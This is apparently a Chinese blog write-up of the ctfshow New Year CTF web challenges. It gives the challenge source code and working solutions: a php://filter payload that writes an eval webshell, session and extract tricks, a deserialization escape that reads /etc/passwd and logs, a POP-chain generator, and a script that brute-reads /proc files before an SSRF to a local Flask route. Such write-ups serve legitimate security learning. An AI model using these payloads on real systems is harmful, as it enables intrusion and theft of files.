---
title: ctfshow-新春欢乐赛
id: ctfshow-新春欢乐赛
date: 2022-02-01 12:40:30
sidebar_position: 9
---

<!-- more -->



放假光顾着玩了=-=，没有学习

## 热身

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-01-16 15:42:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-01-24 22:14:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


eval($_GET['f']);
```

一个一句话木马，连不上，所以file_put_contents再写了一个，

发现再次包含了index.php的源码，似乎是被函数append重定向到了index.php

auto_append_file在所有页面的底部自动包含文件。

去phpinfo找append配置打一个phpinfo发现了配置文件，访问之





## web1

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-01-16 15:42:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-01-24 22:14:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

highlight_file(__FILE__);
error_reporting(0);

$content = $_GET[content];
file_put_contents($content,'<?php exit();'.$content);
```

[探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/266565.html)

```
?content=php://filter/string.strip_tags|convert.base64-decode/resource=?%3EPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B/../shell1.php
```



## web2

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-01-16 15:42:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-01-24 22:14:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

highlight_file(__FILE__);
session_start();
error_reporting(0);

include "flag.php";

if(count($_POST)===1){
        extract($_POST);
        if (call_user_func($$$$$${key($_POST)})==="HappyNewYear"){
                echo $flag;
        }
}
?>

```

count()获取数组元素数目，extract()变量覆盖

key() 返回元素键名

这里使用了可变变量`$$$$$${key($_POST)}`，只要使得键名和键值相同就可以重复指向自身

那么就是找可以传入的东东，一般是头部，这里用的是session

payload:

```
POST:
session_id=session_id

cookie:
PHPSESSID=HappyNewYear
```

## web3

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-01-16 15:42:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-01-24 22:14:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

highlight_file(__FILE__);
error_reporting(0);

include "flag.php";
$key=  call_user_func(($_GET[1]));

if($key=="HappyNewYear"){
  echo $flag;
}

die("虎年大吉，新春快乐！");

虎年大吉，新春快乐！
```

没想到用啥函数，但是发现是弱比较，那么使得key为true或0 即可使得条件 "字符串"==0/true 为真

但是这里phpinfo被ban了找别的函数

![](https://i.loli.net/2021/11/09/wxmMWnr37PZiV4l.png)

在自己机子爆破了一波：

结果为int(0)的函数：

```
getmyuid
getmygid
ob_get_length
json_last_error
preg_last_error
gc_collect_cycles
connection_status
ignore_user_abort
connection_aborted
mysqli_connect_error
mysqli_get_links_stats
```

结果为bool(true)的函数

```
closelog
ob_start
ob_flush
ob_clean
gc_enabled
ob_end_flush
ob_end_clean
mysqli_thread_safe
restore_error_handler
spl_autoload_register
readline_clear_history
restore_exception_handler
output_reset_rewrite_vars
session_start
phpcredits
phpinfo
```



## web4

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-01-16 15:42:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-01-24 22:14:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

highlight_file(__FILE__);
error_reporting(0);

$key=  call_user_func(($_GET[1]));
file_put_contents($key, "<?php eval(\$_POST[1]);?>");

die("虎年大吉，新春快乐！");

虎年大吉，新春快乐！
```

![](https://s2.loli.net/2022/03/27/Ih4H6vfeNcKWGPV.png)

`?1=spl_autoload_extensions`

`.inc,.php`

## web5

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-01-16 15:42:02
# @Last Modified by:   h1xa
# @Last Modified time: 2022-01-24 22:14:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
highlight_file(__FILE__);


include "🐯🐯.php";
file_put_contents("🐯", $flag);
$🐯 = str_replace("hu", "🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯", $_POST['🐯']);
file_put_contents("🐯", $🐯);


```

发送大量的hu即可通过替换实现内存占用放大，超过php最大默认内存256M即可造成变量定义失败，出现致命错误从而跳过后面的覆盖写入。





## web6

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
$function = $_GET['POST'];

function filter($img){
    $filter_arr = array('ctfshow','daniu','happyhuyear');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

if($_SESSION){
    unset($_SESSION);
}

$_SESSION['function'] = $function;

extract($_POST['GET']);

$_SESSION['file'] = base64_encode("/root/flag");

$serialize_info = filter(serialize($_SESSION));

if($function == 'GET'){
    $userinfo = unserialize($serialize_info);
    //出题人已经拿过flag，题目正常,也就是说...
    echo file_get_contents(base64_decode($userinfo['file']));
}
```

反序列化字符逃逸，注意序列化的构造就行

```
GET:
?POST=GET

POST:
GET[_SESSION][function]=happyhuyearctfshow&GET[_SESSION][aa]=";s:1:"a";s:1:"a";s:4:"file";s:92:"cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL2xvZy9uZ2lueC9hY2Nlc3MubG9n";}
```

在本地var_dump一下

```php
string(208) "a:3:{s:8:"function";s:18:"";s:2:"aa";s:130:"";s:1:"a";s:1:"a";s:4:"file";s:92:"cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL2xvZy9uZ2lueC9hY2Nlc3MubG9n";}";s:4:"file";s:16:"L3Jvb3QvZmxhZw==";}"
```

提示出题人拿过flag，那么读一下日志就行：`/var/log/nginx/access.log`

```
127.0.0.1 - - [05/Feb/2022:18:33:29 +0000] "GET /ctfshow HTTP/1.1" 200 45 "-" "curl/7.69.1"
```

访问之



## web7

```php
<?php
include("class.php");
error_reporting(0);
highlight_file(__FILE__);
ini_set("session.serialize_handler", "php");
session_start();

if (isset($_GET['phpinfo']))
{
    phpinfo();
}
if (isset($_GET['source']))
{
    highlight_file("class.php");
}

$happy=new Happy();
$happy();
?>
Happy_New_Year!!!
```

> `phpinfo`
>
> |                           | local_value | master_value  |
> | ------------------------- | ----------- | ------------- |
> | session.serialize_handler | php         | php_serialize |




```php
# class.php
<?php
    class Happy {
        public $happy;
        function __construct(){
                $this->happy="Happy_New_Year!!!";

        }
        function __destruct(){
                $this->happy->happy;

        }
        public function __call($funName, $arguments){
                die($this->happy->$funName);
        }

        public function __set($key,$value)
        {
            $this->happy->$key = $value;
        }
        public function __invoke()
        {
            echo $this->happy;
        }


    }

    class _New_{
        public $daniu;
        public $robot;
        public $notrobot;
        private $_New_;
        function __construct(){
                $this->daniu="I'm daniu.";
                $this->robot="I'm robot.";
                $this->notrobot="I'm not a robot.";

        }
        public function __call($funName, $arguments){
                echo $this->daniu.$funName."not exists!!!";
        }

        public function __invoke()
        {
            echo $this->daniu;
            $this->daniu=$this->robot;
            echo $this->daniu;
        }
        public function __toString()
        {
            $robot=$this->robot;
            $this->daniu->$robot=$this->notrobot;
            return (string)$this->daniu;

        }
        public function __get($key){
               echo $this->daniu.$key."not exists!!!";
        }

 }
    class Year{
        public $zodiac;
         public function __invoke()
        {
            echo "happy ".$this->zodiac." year!";

        }
         function __construct(){
                $this->zodiac="Hu";
        }
        public function __toString()
        {
                $this->show();

        }
        public function __set($key,$value)#3
        {
            $this->$key = $value;
        }

        public function show(){
            die(file_get_contents($this->zodiac));
        }
        public function __wakeup()
        {
            $this->zodiac = 'hu';
        }

    }
?>
```

> **php 处理器**
>
> 序列化的结果为：`session|s:7:"xianzhi";`
>
> `session` 为`$_SESSION['session']`的键名，`|`后为传入 GET 参数经过序列化后的值
>
> **php_serialize 处理器**
>
> 序列化的结果为：`a:1:{s:7:"session";s:7:"xianzhi";}`
>
> `a:1`表示`$_SESSION`数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值

> 在 **php_serialize** 引擎下，session文件中存储的数据为:
>
> ```php
> a:1:{s:4:"name";s:6:"spoock";}
> ```
>
> **php** 引擎下文件内容为:
>
> ```php
> name|s:6:"spoock";
> ```
>
> **php_binary** 引擎下文件内容为:
>
> ```php
> names:6:"spoock";
> ```





> 我这边利用的pop链是
>
>  `Happy:__destruct()=>_New_:__get()=>_New_:__toString()=>Year:__toString()=>Year:Show()` 
>
> payload:
>
> ```php
> <?php
>     class Happy {
>         public $happy;
>     }
> 
>     class _New_{
>         public $daniu;
>         public $robot;
>         public $notrobot;
> 
>  }
>     class Year{
>         public $zodiac;
> 
>     }
> 
> $a=new Happy();
> $a->happy=new _New_();
> $a->happy->daniu=new _New_();
> $a->happy->daniu->daniu=new Year();
> $a->happy->daniu->robot="zodiac";
> $a->happy->daniu->notrobot="/etc/passwd";
> var_dump(serialize($a));
> 
> ?>
> ```
>
> 得到序列化字符串后，可以将其双引号转义并在前方加一个 `|` ，然后通过构造提交用表单截包替换其中的filename，即可得到任意文件读取。
>
> 提交用表单：
>
> ```html
> <form action="http://7182a975-6fe3-4106-a942-5da035f2a132.challenge.ctf.show/" method="POST" enctype="multipart/form-data">
>         <input type="hidden" name='PHP_SESSION_UPLOAD_PROGRESS' value="123" />
>         <input type="file" name="file" />
>         <input type="submit" />
> </form>
> ```
>
> 获得了一个任意文件读取的漏洞，首先想到的是读配置文件和/proc目录，看看有没有别的什么可以利用的点。
>
> /proc/{pid}/cmdline 是所有用户均可读的，可以编写脚本爆一下进程id的cmdline
>
> ```python
> import requests
> import time
> 
> 
> def get_file(filename):
> 	data="""------WebKitFormBoundarytyYa582A3zCNLMeL
> Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
> 
> 123
> ------WebKitFormBoundarytyYa582A3zCNLMeL
> Content-Disposition: form-data; name="file"; filename="|O:5:\\"Happy\\":1:{s:5:\\"happy\\";O:5:\\"_New_\\":3:{s:5:\\"daniu\\";O:5:\\"_New_\\":3:{s:5:\\"daniu\\";O:4:\\"Year\\":1:{s:6:\\"zodiac\\";N;}s:5:\\"robot\\";s:6:\\"zodiac\\";s:8:\\"notrobot\\";s:"""+str(len(filename))+""":\\\""""+filename+"""\\";}s:5:\\"robot\\";N;s:8:\\"notrobot\\";N;}}\"
> Content-Type: text/plain
> 
> 
> ------WebKitFormBoundarytyYa582A3zCNLMeL--"""
> 	r=requests.post(url='http://851cd04b-d7ed-487c-abf4-87470a74b8f5.challenge.ctf.show/',data=data,headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundarytyYa582A3zCNLMeL','Cookie': 'PHPSESSID=iot4d3hd1isme3q26hl49361rk'})
> 	return(r.text.encode()[1990:])#去掉源码信息，encode是为了能显示\00
> 
> for i in range(999):
> 	print(i)
> 	print(get_file('/proc/'+str(i)+'/cmdline'))
> 	time.sleep(0.2)
> ```
>
> 可以查看到114进程开了一个 ` python3 /app/server.py` 
>
> 读一下这个文件，源码：
>
> ```python
> from flask import *
> import os
> 
> app = Flask(__name__)
> flag=open('/flag','r')
> #flag我删了
> os.remove('/flag')
> 
> @app.route('/', methods=['GET', 'POST'])
> def index():
> 	return "flag我删了，你们别找了"
> 
> @app.route('/download/', methods=['GET', 'POST'])
> def download_file():
>     return send_file(request.args['filename'])
> 
> 
> if __name__ == '__main__':
>     app.run(host='127.0.0.1', port=5000, debug=False)
> ```
>
> 可以发现flag文件被删掉了，flask在5000起了一个server，还有一个任意文件读取的路径：/download/
>
> 但是flag是在open之后被删的，而且还没有释放，所以可以在/proc/self/fd/下面找到，
>
> file_get_contents()是可以读http协议的资源的，于是读取 `"http://127.0.0.1:5000/download/?filename=/proc/self/fd/3"` 即可得到flag
>
> 0是stdin 1是stdout 2是stderr，fd号可以从3开始尝试。
